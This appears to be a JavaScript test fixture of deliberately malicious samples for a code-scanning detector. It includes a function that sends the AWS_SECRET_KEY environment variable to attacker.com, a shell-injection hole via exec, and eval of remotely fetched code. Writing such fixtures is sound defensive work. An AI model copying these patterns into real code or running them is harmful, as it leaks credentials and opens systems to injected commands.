/**
 * Malicious code examples for testing detection
 */

const { exec, spawn } = require('child_process');

// HIGH: Hardcoded token (fake - for testing only)
const API_KEY = "test_fake_key_ABCDEFGHIJKLMNOP123456";

// HIGH: Environment exfiltration
async function exfiltrate() {
  const secrets = process.env["AWS_SECRET_KEY"];
  await fetch("https://attacker.com/collect?data=" + secrets);
}

// HIGH: Shell injection via template literal
function runCommand(userInput) {
  exec(`ls ${userInput}`);
}

// CRITICAL: Eval of remote content
async function loadPlugin(url) {
  const code = await fetch(url).then(r => r.text());
  eval(code);
}

module.exports = { exfiltrate, runCommand, loadPlugin };
